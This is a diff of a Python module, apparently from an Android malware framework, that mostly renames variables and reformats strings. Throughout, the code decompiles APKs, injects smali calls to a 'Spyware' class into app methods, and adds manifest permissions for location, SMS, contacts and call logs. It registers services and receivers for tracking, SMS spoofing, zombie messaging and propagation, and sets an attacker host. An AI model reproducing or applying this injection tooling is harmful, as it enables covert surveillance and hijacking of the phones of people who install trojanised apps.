@@ -20,7 +20,8 @@ import zipfile
 
 from metadata import metadata
 from payloads.payload import Payload
-from utils import info, register, util
+from utils import config, register, util
+
 
 class Spyware(Payload):
     def __init__(self, args):
@@ -30,25 +31,24 @@ class Spyware(Payload):
 
     def run(self):
         self.update_manifest()
-        payload_path = self.copy_to_apk(self.target)
-        self.set_rhost_ppg(payload_path)
+        payloadir_path = self.export_payload(self.destination)
+        self.set_rhost_ppg(payloadir_path)
 
         if (os.path.isdir(self.target)):
-            d_metadata = metadata.generate_d_metadata(self.target)
-            self.inject_in_dir(d_metadata)
+            dir_metadata = metadata.generate_dir_metadata(self.target)
+            self.inject_in_dir(dir_metadata)
 
             # Displays result information
-            util.get_dir_info(self, d_metadata)
+            return util.get_dir_info(self, dir_metadata)
 
         elif (os.path.isfile(self.target)):
-            f_metadata = metadata.generate_f_metadata(self.target)
-            self.inject(self.target, f_metadata)
+            file_metadata = metadata.generate_file_metadata(self.target)
+            self.inject(self.target, file_metadata)
 
             # Displays result information
-            util.get_file_info(self, f_metadata)
+            return util.get_file_info(self, file_metadata)
 
-
-    def inject(self, f_path, f_metadata):
+    def inject(self, file_path, file_metadata):
         """
         Inject the spyware.
         """
@@ -57,7 +57,7 @@ class Spyware(Payload):
         valid_regs = []
         process = False
 
-        with open(f_path, 'r') as file:
+        with open(file_path, 'r') as file:
             for line in file:
                 # We ignore the abstract and static methods (we need to get
                 # an application context (this))
@@ -68,7 +68,7 @@ class Spyware(Payload):
                         any(keyword in line for keyword in self.keywords))):
                     words = line.split()
                     # Retrieving the method information from the meta-data
-                    data = metadata.get_data(words[-1], f_metadata)
+                    data = metadata.get_data(words[-1], file_metadata)
                     valid_regs = register.get_valid_regs(data[3], data[2])
                     # The method must have at least one free register, less
                     # than sixteen register, must not
@@ -82,27 +82,42 @@ class Spyware(Payload):
                 elif ((line.find("return", 0, 20) > 0) and (process)):
                     # We mark the method as processed
                     buffer.append("\t# {0} has been injected on {1}\n".format(
-                        self.name, time.strftime("%Y-%m-%d %H:%M:%S",
-                                                 time.gmtime())))
+                        self.name, time.strftime(
+                            "%Y-%m-%d %H:%M:%S", time.gmtime())))
                     data[5].append(self.name)
 
                     # We initialize our spyware class with an application
                     # context
-                    buffer.append("\tnew-instance {0}, \
-                        Landroid/spyware/Spyware;\n".format(valid_regs[0]))
-                    buffer.append("\tinvoke-virtual {{p0}}, \{0}->getApplicatio\
-                        nContext()Landroid/content/Context;\n".format(data[0]))
-                    buffer.append("\tmove-result-object {0}\n".format(
-                        valid_regs[1]))
-                    buffer.append("\tinvoke-direct {{{0}, {1}}}, \
-                        Landroid/spyware/Spyware;-><init>(Landroid/content/Cont\
-                        ext;)V\n".format(valid_regs[0], valid_regs[1]))
+                    buffer.append(
+                        "\tnew-instance {0},"
+                        " Landroid/spyware/Spyware;\n".format(valid_regs[0])
+                    )
+                    buffer.append(
+                        "\tinvoke-virtual {{p0}}, "
+                        "\{0}->getApplicationContext()"
+                        "Landroid/content/Context;\n".format(data[0])
+                    )
+                    buffer.append(
+                        "\tmove-result-object {0}\n".format(valid_regs[1])
+                    )
+                    buffer.append(
+                        "\tinvoke-direct {{{0}, {1}}}, "
+                        "Landroid/spyware/Spyware;-><init>"
+                        "(Landroid/content/Context;)V\n".format(
+                            valid_regs[0], valid_regs[1])
+                    )
 
                     # We instantiate a spyware and hijack the app
-                    buffer.append("\t.local {0}, \"launcher\":Landroid/spyware/\
-                        Spyware;\n".format(valid_regs[0]))
-                    buffer.append("\tinvoke-virtual {{{0}}}, Landroid/spyware/\
-                        Spyware;->run()V\n".format(valid_regs[0]))
+                    buffer.append(
+                        '\t.local {0}, '
+                        '"launcher":Landroid/spyware/Spyware;\n'.format(
+                            valid_regs[0])
+                    )
+                    buffer.append(
+                        "\tinvoke-virtual {{{0}}}, "
+                        "Landroid/spyware/Spyware;->run()V\n".format(
+                            valid_regs[0])
+                    )
                     buffer.append(line)
 
                 # Resetting the vars for the next method
@@ -117,7 +132,7 @@ class Spyware(Payload):
                     buffer.append(line)
 
         # Overwritting the .smali file
-        with open(f_path, 'w') as file:
+        with open(file_path, 'w') as file:
             for line in buffer:
                 file.write(line)
 
@@ -127,131 +142,184 @@ class Spyware(Payload):
         Disassemble an app using apktool to extract, edit and recompile
         the AndroidManifest.
         """
-        cmd = "apktool d -f -s {0} -o {1}".format(self.app, os.path.join(
-            "tmp", self.app_name + "-res"))
-        subprocess.call([cmd], shell=True, stdout=subprocess.DEVNULL,
+        instruction = (
+            "../libs/apktool d -f -s {} -o {}".format(
+                self.app, os.path.join(
+                    config.TMP_FOLDER, self.app_name + "-res"))
+        )
+        subprocess.call(instruction, shell=True, stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL)
 
-        self.add_permissions(os.path.join("tmp", self.app_name + "-res",
-                                          "AndroidManifest.xml"))
+        self.add_permissions(os.path.join(
+            config.TMP_FOLDER, self.app_name + "-res", "AndroidManifest.xml"))
 
-        cmd = "apktool b -f {0} -o {1}".format(os.path.join(
-            "tmp", self.app_name + "-res"), os.path.join(
-            "tmp", self.app_name + "-res.apk"))
-        subprocess.call([cmd], shell=True, stdout=subprocess.DEVNULL,
+        instruction = "apktool b -f {0} -o {1}".format(os.path.join(
+            config.TMP_FOLDER, self.app_name + "-res"), os.path.join(
+            config.TMP_FOLDER, self.app_name + "-res.apk"))
+        subprocess.call(instruction, shell=True, stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL)
 
         if not (os.path.exists(
-                os.path.join("tmp", self.app_name + "-res.apk"))):
+                os.path.join(config.TMP_FOLDER, self.app_name + "-res.apk"))):
             return False
 
         # We remove the generated folder "-res"
-        shutil.rmtree(os.path.join("tmp", self.app_name + "-res"))
+        shutil.rmtree(os.path.join(config.TMP_FOLDER, self.app_name + "-res"))
 
         # We extract and move the recoded AndroidManifest.xml from the
         # "-res.apk"
         zipfile.ZipFile(os.path.join(
-            "tmp", self.app_name +
-            "-res.apk")).extractall(os.path.join("tmp",
+            config.TMP_FOLDER, self.app_name +
+            "-res.apk")).extractall(os.path.join(config.TMP_FOLDER,
                                                  self.app_name + "-manif"))
-        util.move_file(os.path.join(
-            "tmp", self.app_name + "-manif", "AndroidManifest.xml"),
-            os.path.join("tmp", "AndroidManifest.xml"))
+        util.move(os.path.join(
+            config.TMP_FOLDER, self.app_name +
+            "-manif", "AndroidManifest.xml"),
+            os.path.join(config.TMP_FOLDER, "AndroidManifest.xml"))
 
         # We remove the generated "-res.apk" and "-manif" folder
-        shutil.rmtree(os.path.join("tmp", self.app_name + "-manif"))
-        os.remove(os.path.join("tmp", self.app_name + "-res.apk"))
+        shutil.rmtree(os.path.join(
+            config.TMP_FOLDER, self.app_name + "-manif"))
+        os.remove(os.path.join(config.TMP_FOLDER, self.app_name + "-res.apk"))
 
         return True
 
-    def set_rhost_ppg(self, d_path):
+    def set_rhost_ppg(self, dir_path):
         """
         Add the rhost and ppg to the AndroidManifest.
         """
-        files = os.listdir(d_path)
+        files = os.listdir(dir_path)
 
         for file in files:
             buffer = []
-            f_path = os.path.abspath(os.path.join(d_path, file))
+            file_path = os.path.abspath(os.path.join(dir_path, file))
 
-            with open(f_path, 'r') as file:
+            with open(file_path, 'r') as file:
                 for line in file:
                     if (line.find("<--ATTACKER-->") >= 0):
-                        buffer.append(line.replace("<--ATTACKER-->",
-                                                   self.rhost))
+                        buffer.append(
+                            line.replace("<--ATTACKER-->", self.rhost)
+                        )
                     elif (line.find("<--PROPAGATE-->") >= 0):
-                        buffer.append(line.replace("<--PROPAGATE-->",
-                                                   self.propagate))
+                        buffer.append(
+                            line.replace("<--PROPAGATE-->", self.propagate)
+                        )
                     else:
                         buffer.append(line)
 
             # Overwritting the .smali file
-            with open(f_path, 'w') as file:
+            with open(file_path, 'w') as file:
                 for line in buffer:
                     file.write(line)
 
-    def add_permissions(self, f_path):
+    def add_permissions(self, file_path):
         """
         Add the minimum required permissions, services and broadcastReceivers
         to the AndroidManifest.
         """
-        m_path = os.path.abspath(f_path)
+        manifest_path = os.path.abspath(file_path)
         buffer = []
 
-        with open(m_path, 'r') as file:
+        with open(manifest_path, 'r') as file:
             for line in file:
                 if (line.find("<manifest ") >= 0):
                     buffer.append(line)
-                    buffer.append('\t<uses-permission \
-                        android:name="android.permission.\
-                        ACCESS_COARSE_LOCATION"/>\n')
-                    buffer.append('\t<uses-permission \
-                        android:name="android.permission.\
-                        ACCESS_FINE_LOCATION"/>\n')
-                    buffer.append('\t<uses-permission \
-                        android:name="android.permission.\
-                        ACCESS_NETWORK_STATE"/>\n')
-                    buffer.append('\t<uses-permission \
-                        android:name="android.permission.GET_ACCOUNTS"/>\n')
-                    buffer.append('\t<uses-permission \
-                        android:name="android.permission.INTERNET"/>\n')
-                    buffer.append('\t<uses-permission \
-                        android:name="android.permission.READ_CALL_LOG"/>\n')
-                    buffer.append('\t<uses-permission \
-                        android:name="android.permission.READ_CONTACTS"/>\n')
-                    buffer.append('\t<uses-permission \
-                        android:name="android.permission.\
-                        READ_PHONE_STATE"/>\n')
-                    buffer.append('\t<uses-permission \
-                        android:name="android.permission.READ_SMS"/>\n')
-                    buffer.append('\t<uses-permission \
-                        android:name="android.permission.RECEIVE_SMS"/>\n')
-                    buffer.append('\t<uses-permission \
-                        android:name="android.permission.SEND_SMS"/>\n')
+                    buffer.append(
+                        '\t<uses-permission '
+                        'android:name="android.permission.'
+                        'ACCESS_COARSE_LOCATION"/>\n'
+                    )
+                    buffer.append(
+                        '\t<uses-permission '
+                        'android:name="android.permission.'
+                        'ACCESS_FINE_LOCATION"/>\n'
+                    )
+                    buffer.append(
+                        '\t<uses-permission '
+                        'android:name="android.permission.'
+                        'ACCESS_NETWORK_STATE"/>\n'
+                    )
+                    buffer.append(
+                        '\t<uses-permission '
+                        'android:name="android.permission.'
+                        'GET_ACCOUNTS"/>\n'
+                    )
+                    buffer.append(
+                        '\t<uses-permission '
+                        'android:name="android.permission.'
+                        'INTERNET"/>\n'
+                    )
+                    buffer.append(
+                        '\t<uses-permission '
+                        'android:name="android.permission.'
+                        'READ_CALL_LOG"/>\n'
+                    )
+                    buffer.append(
+                        '\t<uses-permission '
+                        'android:name="android.permission.'
+                        'READ_CONTACTS"/>\n'
+                    )
+                    buffer.append(
+                        '\t<uses-permission '
+                        'android:name="android.permission.'
+                        'READ_PHONE_STATE"/>\n'
+                    )
+                    buffer.append(
+                        '\t<uses-permission '
+                        'android:name="android.permission.'
+                        'READ_SMS"/>\n'
+                    )
+                    buffer.append(
+                        '\t<uses-permission '
+                        'android:name="android.permission.'
+                        'RECEIVE_SMS"/>\n'
+                    )
+                    buffer.append(
+                        '\t<uses-permission '
+                        'android:name="android.permission.'
+                        'SEND_SMS"/>\n'
+                    )
 
                 elif (line.find("<application ") >= 0):
                     buffer.append(line)
-                    buffer.append('\t<service \
-                        android:name="android.spyware.PropagateS"/>\n')
-                    buffer.append('\t<service \
-                        android:name="android.spyware.TrackerS"/>\n\n')
+                    buffer.append(
+                        '\t<service '
+                        'android:name="android.spyware.'
+                        'PropagateS"/>\n'
+                    )
+                    buffer.append(
+                        '\t<service '
+                        'android:name="android.spyware.'
+                        'TrackerS"/>\n\n'
+                    )
 
-                    buffer.append('\t<receiver \
-                        android:name="android.spyware.SendSMSR">\n')
+                    buffer.append(
+                        '\t<receiver '
+                        'android:name="android.spyware.'
+                        'SendSMSR">\n'
+                    )
                     buffer.append('\t\t<intent-filter>\n')
-                    buffer.append('\t\t\t<action \
-                        android:name="android.provider.\
-                        Telephony.SMS_RECEIVED"/>\n')
+                    buffer.append(
+                        '\t\t\t<action '
+                        'android:name="android.provider.'
+                        'Telephony.SMS_RECEIVED"/>\n'
+                    )
                     buffer.append('\t\t</intent-filter>\n')
                     buffer.append('\t</receiver>\n')
-                    buffer.append('\t<receiver \
-                        android:name="android.spyware.SendZombieR"/>\n')
-                    buffer.append('\t<receiver \
-                        android:name="android.spyware.SpoofSMSR"/>\n\n')
+                    buffer.append(
+                        '\t<receiver '
+                        'android:name="android.spyware.'
+                        'SendZombieR"/>\n'
+                    )
+                    buffer.append(
+                        '\t<receiver '
+                        'android:name="android.spyware.'
+                        'SpoofSMSR"/>\n\n'
+                    )
                 else:
                     buffer.append(line)
 
         # Overwritting the .smali file
-        with open(m_path, 'w') as file:
+        with open(manifest_path, 'w') as file:
             for line in buffer:
                 file.write(line)
